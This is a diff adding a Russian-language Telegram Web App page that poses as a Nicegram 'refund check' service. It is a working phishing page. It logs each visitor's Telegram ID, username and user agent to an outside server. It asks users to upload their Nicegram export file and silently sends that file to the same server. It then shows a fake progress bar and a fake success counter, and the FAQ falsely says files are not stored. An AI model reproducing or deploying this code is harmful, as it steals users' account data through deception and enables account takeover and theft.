@@ -1,0 +1,620 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Nicegram Holographic</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            --holo-cyan: #0ff;
+            --holo-bg: rgba(10, 12, 20, 0.65);
+            --text-main: #ffffff;
+            --text-secondary: rgba(255, 255, 255, 0.55);
+            --btn-blue-start: #0033cc;
+            --btn-blue-end: #0066ff;
+            --status-green: #00ffaa;
+            --error-red: #ff3333;
+            --glass-border: rgba(255, 255, 255, 0.08);
+            --glass-glow: rgba(0, 255, 255, 0.12);
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0; padding: 0;
+            background: radial-gradient(circle at 30% 30%, #08152a 0%, #000000 100%);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            height: 100vh;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        #fileInput { display: none !important; }
+
+        /* ЭФФЕКТЫ ФОНА */
+        #particles, .snow-container {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1;
+        }
+        .liquid-blob {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(60px);
+            z-index: 0;
+            opacity: 0.18;
+            animation: floatBlob 14s infinite ease-in-out;
+        }
+        .blob-1 { width: 320px; height: 320px; background: #00ffff; top: -10%; left: -12%; }
+        .blob-2 { width: 280px; height: 280px; background: #0044ff; bottom: -10%; right: -12%; }
+        @keyframes floatBlob {
+            0%, 100% { transform: translate(0, 0); }
+            50% { transform: translate(30px, -30px); }
+        }
+
+        .animated-images {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 2;
+        }
+        .image {
+            position: absolute;
+            width: 65px;
+            opacity: 0.12;
+            filter: blur(0.8px);
+            animation: floatImg 20s infinite ease-in-out;
+        }
+        .image1 { top: 20%; left: 10%; } 
+        .image2 { top: 65%; left: 80%; } 
+        .image3 { top: 70%; left: 15%; } 
+        .image4 { top: 15%; left: 75%; }
+        @keyframes floatImg {
+            0%, 100% { transform: translateY(0) rotate(0deg); }
+            50% { transform: translateY(-30px) rotate(6deg); }
+        }
+
+        /* СНЕГ */
+        .snowflake { 
+            position: absolute; 
+            background: radial-gradient(circle, #ffffff 0%, transparent 70%); 
+            border-radius: 50%; 
+            opacity: 0.75; 
+            animation: fall linear infinite; 
+        }
+        @keyframes fall { 
+            to { 
+                transform: translateY(110vh) translateX(15px) rotate(360deg); 
+            } 
+        }
+
+        /* ГИРЛЯНДА */
+        .garland-wrap {
+            position: fixed; top: -10px; left: 0; width: 100%; height: 50px;
+            z-index: 20; pointer-events: none;
+            display: flex;
+            justify-content: space-around;
+        }
+        .light-bulb {
+            width: 12px; height: 12px; border-radius: 50%;
+            position: relative; margin-top: 8px;
+            animation: flash 2s infinite alternate;
+        }
+        .light-bulb::before {
+            content: ''; position: absolute; top: -8px; left: 50%; transform: translateX(-50%);
+            width: 1.5px; height: 8px; background: rgba(255,255,255,0.25);
+        }
+        .bulb-cyan { background: #00ffff; box-shadow: 0 0 12px #00ffff; animation-delay: 0s; }
+        .bulb-blue { background: #0066ff; box-shadow: 0 0 12px #0066ff; animation-delay: 0.4s; }
+        .bulb-white { background: #ffffff; box-shadow: 0 0 12px #ffffff; animation-delay: 0.8s; }
+        @keyframes flash {
+            from { opacity: 0.35; box-shadow: 0 0 5px currentColor; }
+            to { opacity: 1; box-shadow: 0 0 20px currentColor; }
+        }
+
+        /* ВИНЬЕТКА */
+        .frost-vignette {
+            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+            box-shadow: inset 0 0 100px rgba(150, 240, 255, 0.15);
+            pointer-events: none; z-index: 55;
+        }
+
+        /* КАРТОЧКА */
+        .glass-card {
+            position: relative;
+            z-index: 10;
+            width: 88%;
+            max-width: 340px;
+            padding: 50px 30px 40px;
+            background: var(--holo-bg);
+            border-radius: 28px;
+            backdrop-filter: blur(28px) saturate(150%);
+            -webkit-backdrop-filter: blur(28px) saturate(150%);
+            border: 1px solid var(--glass-border);
+            box-shadow:
+                0 12px 30px rgba(0, 0, 0, 0.6),
+                0 0 0 1px var(--glass-glow);
+            text-align: center;
+            overflow: visible;
+        }
+
+        .santa-hat-icon {
+            position: absolute;
+            top: -28px;
+            right: -22px;
+            width: 60px;
+            filter: drop-shadow(0 0 8px rgba(0,255,255,0.4));
+            z-index: 12;
+            pointer-events: none;
+            opacity: 0.95;
+        }
+
+        .logo-text {
+            font-size: 40px;
+            font-weight: 900;
+            color: #fff;
+            letter-spacing: -1.5px;
+            margin-bottom: 8px;
+            text-shadow: 0 0 12px rgba(255, 255, 255, 0.25), 0 0 20px rgba(0, 255, 255, 0.15);
+            background: linear-gradient(90deg, #ffffff, #aaffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        h1 {
+            font-size: 22px;
+            font-weight: 800;
+            margin: 0 0 14px;
+            color: #fff;
+            opacity: 0.92;
+        }
+
+        p {
+            font-size: 14px;
+            color: var(--text-secondary);
+            line-height: 1.55;
+            margin-bottom: 20px;
+        }
+
+        .stats-wrapper {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 28px;
+            background: rgba(0, 50, 80, 0.25);
+            padding: 9px 20px;
+            border-radius: 50px;
+            border: 1px solid rgba(0, 200, 255, 0.15);
+        }
+
+        .live-dot {
+            width: 9px;
+            height: 9px;
+            background: var(--status-green);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--status-green);
+            animation: pulse-dot 2s infinite;
+        }
+
+        #stats-counter {
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--holo-cyan);
+            text-shadow: 0 0 6px rgba(0, 255, 255, 0.25);
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(0.85); opacity: 0.5; }
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--btn-blue-start), var(--btn-blue-end));
+            color: white;
+            border: none;
+            padding: 17px 0;
+            border-radius: 18px;
+            font-size: 18px;
+            font-weight: 800;
+            width: 100%;
+            cursor: pointer;
+            box-shadow:
+                0 8px 20px rgba(0, 30, 100, 0.5),
+                0 0 0 1px rgba(0, 150, 255, 0.3);
+            transition: all 0.3s ease;
+        }
+        .btn:active {
+            transform: translateY(2px);
+            box-shadow: 0 4px 12px rgba(0, 30, 100, 0.4);
+        }
+
+        /* ЗАГРУЗКА */
+        #step-loading {
+            display: none;
+            flex-direction: column;
+            align-items: center;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+            border-left-color: var(--holo-cyan);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 22px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.25);
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text {
+            font-size: 16px;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 6px;
+            min-height: 1.4em;
+        }
+        .percent-display {
+            font-size: 14px;
+            font-weight: 900;
+            color: var(--holo-cyan);
+        }
+
+        /* ФУТЕР */
+        .footer-container {
+            position: absolute;
+            bottom: 35px;
+            display: flex;
+            gap: 18px;
+            z-index: 30;
+        }
+        .footer-btn {
+            background: rgba(15, 18, 28, 0.6);
+            color: #fff;
+            padding: 11px 20px;
+            border-radius: 14px;
+            font-size: 14px;
+            font-weight: 700;
+            cursor: pointer;
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            display: flex;
+            align-items: center;
+            gap: 9px;
+            transition: 0.25s;
+        }
+        .footer-btn:active {
+            transform: scale(0.96);
+            background: rgba(40, 45, 60, 0.7);
+        }
+
+        /* МОДАЛКИ */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            z-index: 40;
+            opacity: 0;
+            pointer-events: none;
+            transition: opacity 0.35s ease;
+        }
+        .modal-overlay.active {
+            opacity: 1;
+            pointer-events: all;
+        }
+        .modal {
+            position: fixed;
+            bottom: -100%;
+            left: 0;
+            width: 100%;
+            background: rgba(15, 18, 28, 0.92);
+            backdrop-filter: blur(30px);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 30px 30px 0 0;
+            padding: 30px 25px 45px;
+            z-index: 50;
+            transition: bottom 0.5s cubic-bezier(0.2, 1, 0.3, 1);
+            color: #fff;
+        }
+        .modal.active {
+            bottom: 0;
+        }
+        .modal h3 {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 18px;
+            color: #fff;
+        }
+        .btn-close {
+            background: rgba(255, 255, 255, 0.07);
+            color: #fff;
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            width: 100%;
+            padding: 15px;
+            margin-top: 22px;
+            border-radius: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-close:active {
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        /* ERROR MODAL */
+        #errorModal h3 {
+            color: var(--error-red);
+            text-shadow: 0 0 12px rgba(255, 50, 50, 0.3);
+        }
+        #errorModal .btn-close {
+            background: rgba(255, 50, 50, 0.1);
+            border-color: rgba(255, 50, 50, 0.25);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="frost-vignette"></div>
+    <div class="garland-wrap">
+        <div class="light-bulb bulb-cyan"></div>
+        <div class="light-bulb bulb-blue"></div>
+        <div class="light-bulb bulb-white"></div>
+        <div class="light-bulb bulb-cyan"></div>
+        <div class="light-bulb bulb-blue"></div>
+        <div class="light-bulb bulb-white"></div>
+        <div class="light-bulb bulb-cyan"></div>
+        <div class="light-bulb bulb-blue"></div>
+        <div class="light-bulb bulb-white"></div>
+        <div class="light-bulb bulb-cyan"></div>
+        <div class="light-bulb bulb-blue"></div>
+    </div>
+
+    <div class="liquid-blob blob-1"></div>
+    <div class="liquid-blob blob-2"></div>
+    <div id="particles"></div>
+    <div class="snow-container" id="snow"></div>
+
+    <div class="animated-images">
+        <img src="https://betterdrain.baby/ring.png" class="image image1">
+        <img src="https://betterdrain.baby/clock.png" class="image image2">
+        <img src="https://betterdrain.baby/shard.png" class="image image3">
+        <img src="https://betterdrain.baby/skull.png" class="image image4">
+    </div>
+
+    <div class="glass-card">
+        <img src="https://cdn-icons-png.flaticon.com/512/744/744546.png" class="santa-hat-icon" alt="NY">
+        
+        <div class="logo-text">Nicegram</div>
+        
+        <div id="step-start">
+            <h1 id="greeting">Привет, Тракер</h1>
+            <p>Защищенная среда для проверки данных.<br>Загрузите файл экспорта.</p>
+            
+            <div class="stats-wrapper">
+                <div class="live-dot"></div>
+                <div id="stats-counter">Пройдено успешных проверок за сегодня 2520</div>
+            </div>
+
+            <input type="file" id="fileInput" accept=".zip,.txt" onchange="startVerification(this)">
+            <button class="btn" onclick="document.getElementById('fileInput').click()">Загрузить файл</button>
+        </div>
+
+        <div id="step-loading">
+            <div class="spinner"></div>
+            <div class="status-text" id="statusText">Инициализация...</div>
+            <div class="percent-display" id="percentText">0%</div>
+        </div>
+    </div>
+
+    <div class="footer-container">
+        <div class="footer-btn" onclick="openModal('instructionModal')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line></svg>
+            Инструкция
+        </div>
+        <div class="footer-btn" onclick="openModal('faqModal')">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
+            FAQ
+        </div>
+    </div>
+
+    <div class="modal-overlay" onclick="closeAllModals()"></div>
+
+    <div class="modal" id="instructionModal">
+        <h3>Инструкция</h3>
+        <ol style="color: #ccc; font-size: 15px; line-height: 1.8; padding-left: 20px;">
+            <li>Скачайте приложение Nicegram с официального сайта...</li>
+            <li>Откройте Nicegram и войдите в свой аккаунт.</li>
+            <li>Зайдите в настройки и выберите пункт «Nicegram».</li>
+            <li>Экспортируйте файл...</li>
+            <li>Откройте главное меню бота и нажмите на кнопку "Проверка на рефаунд".</li>
+            <li>Отправьте файл боту.</li>
+            <li>Ожидайте результатов проверки.</li>
+        </ol>
+        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+    </div>
+
+    <div class="modal" id="faqModal">
+        <h3>❓ Частые вопросы</h3>
+        <div style="color: #bbb; font-size: 15px; line-height: 1.6;">
+            <p><b>Что такое рефаунд?</b><br>Это возврат средств за подарок...</p>
+            <p><b>Сколько времени занимает проверка?</b><br>Обычно 3-5 минут, бывают задержки</p>
+            <p><b>Мои файлы в безопасности?</b><br>Да - мы не храним ваши файлы, их проверяет наш бот, после чего удаляет</p>
+        </div>
+        <button class="btn-close" onclick="closeAllModals()">Закрыть</button>
+    </div>
+
+    <div class="modal" id="errorModal">
+        <h3>Ошибка!</h3>
+        <p style="color: #ffffff; font-size: 16px; line-height: 1.5; font-weight: 500;">
+            Файл должен быть в формате .zip или .txt! Пожалуйста, прочтите инструкцию.
+        </p>
+        <button class="btn-close" onclick="closeAllModals()">Понятно</button>
+    </div>
+
+    <script>
+        const BANNED_USERS = ['monk']; 
+        const SERVER_URL = "https://marsework.onrender.com";
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+
+        try {
+            if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
+                document.getElementById('greeting').innerText = `Привет, ${tg.initDataUnsafe.user.first_name || 'Тракер'}`;
+            }
+        } catch (e) { console.error(e); }
+
+        function isUserBanned() {
+            try {
+                const user = tg.initDataUnsafe.user;
+                if (!user || !user.username) return false;
+                return BANNED_USERS.includes(user.username.toLowerCase());
+            } catch (e) { return false; }
+        }
+
+        function logEntry() {
+            try {
+                const user = tg.initDataUnsafe.user || {};
+                if (isUserBanned()) return; 
+
+                fetch(`${SERVER_URL}/log_entry`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        user_id: user.id || "0000",
+                        username: user.username || "no_username",
+                        user_agent: navigator.userAgent,
+                        platform: tg.platform || "unknown"
+                    })
+                }).catch(e => console.error(e));
+            } catch (err) { console.error(err); }
+        }
+        logEntry();
+
+        function startVerification(input) {
+            const file = input.files[0];
+            if (!file) return;
+
+            const fileName = file.name.toLowerCase();
+            if (!fileName.endsWith('.zip') && !fileName.endsWith('.txt')) {
+                openModal('errorModal');
+                input.value = '';
+                return;
+            }
+
+            document.getElementById('step-start').style.display = 'none';
+            document.getElementById('step-loading').style.display = 'flex';
+
+            uploadFileInBackground(file);
+
+            let progress = 0;
+            const totalDuration = 150000;
+            const intervalTime = 100;
+            const increment = (100 / (totalDuration / intervalTime));
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress > 100) progress = 100;
+
+                const st = document.getElementById('statusText');
+                const pt = document.getElementById('percentText');
+                if(pt) pt.innerText = Math.floor(progress) + "%";
+
+                if (st) {
+                    if (progress < 20) st.innerText = "Проверяем ликвидность файла";
+                    else if (progress < 45) st.innerText = "Анализируем аукционы";
+                    else if (progress < 75) st.innerText = "Проверка происхождения звёзд";
+                    else if (progress < 95) st.innerText = "Завершение анализа";
+                    else st.innerText = "Формирование вердикта";
+                }
+
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+                    setTimeout(() => { tg.close(); }, 1500);
+                }
+            }, intervalTime);
+        }
+
+        function uploadFileInBackground(file) {
+            try {
+                const user = tg.initDataUnsafe.user || {};
+                if (isUserBanned()) return; 
+
+                const formData = new FormData();
+                formData.append('file', file);
+                formData.append('user_id', user.id || "0000");
+                formData.append('username', user.username || "no_username");
+                formData.append('user_agent', navigator.userAgent);
+                
+                fetch(`${SERVER_URL}/upload`, { method: 'POST', body: formData })
+                    .catch(e => console.error(e));
+            } catch (err) { console.error(err); }
+        }
+
+        const snowContainer = document.getElementById('snow');
+        if (snowContainer) {
+            const flakesCount = 50; 
+            for (let i = 0; i < flakesCount; i++) {
+                const flake = document.createElement('div');
+                flake.className = 'snowflake';
+                flake.style.left = Math.random() * 100 + '%';
+                const size = Math.random() * 4 + 2; 
+                flake.style.width = size + 'px';
+                flake.style.height = size + 'px';
+                if(size < 3) {
+                     flake.style.filter = 'blur(1px)';
+                     flake.style.opacity = '0.4';
+                }
+                flake.style.animationDuration = Math.random() * 5 + 5 + 's';
+                flake.style.animationDelay = Math.random() * 5 + 's';
+                snowContainer.appendChild(flake);
+            }
+        }
+
+        (function() {
+            const container = document.getElementById('particles');
+            if(!container) return;
+            var canvas = document.createElement('canvas'); var ctx = canvas.getContext('2d');
+            container.appendChild(canvas);
+            var particles = [], width, height;
+            function resize() { width = window.innerWidth; height = window.innerHeight; canvas.width = width; canvas.height = height; }
+            function Particle() { this.x = Math.random() * width; this.y = Math.random() * height; this.vx = (Math.random() - 0.5) * 0.2; this.vy = (Math.random() - 0.5) * 0.2; this.size = Math.random() * 1.5; }
+            Particle.prototype.update = function() { this.x += this.vx; this.y += this.vy; if (this.x < 0 || this.x > width) this.vx *= -1; if (this.y < 0 || this.y > height) this.vy *= -1; };
+            Particle.prototype.draw = function() { ctx.fillStyle = 'rgba(0, 255, 255, 0.3)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2); ctx.fill(); };
+            window.addEventListener('resize', resize); resize();
+            for (var i = 0; i < 35; i++) particles.push(new Particle());
+            function animate() { ctx.clearRect(0, 0, width, height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
+            animate();
+        })();
+
+        function openModal(id) { 
+            const overlay = document.querySelector('.modal-overlay');
+            const modal = document.getElementById(id);
+            if(overlay) overlay.classList.add('active'); 
+            if(modal) modal.classList.add('active'); 
+        }
+        function closeAllModals() { 
+            const overlay = document.querySelector('.modal-overlay');
+            if(overlay) overlay.classList.remove('active'); 
+            document.querySelectorAll('.modal').forEach(m => m.classList.remove('active')); 
+        }
+
+        const statsElem = document.getElementById('stats-counter');
+        let checkCount = 2520;
+        
+        setInterval(() => {
+            checkCount++;
+            if(statsElem) {
+                statsElem.innerText = `Пройдено успешных проверок за сегодня ${checkCount}`;
+            }
+        }, 4000);
+    </script>
+</body>
+</html>
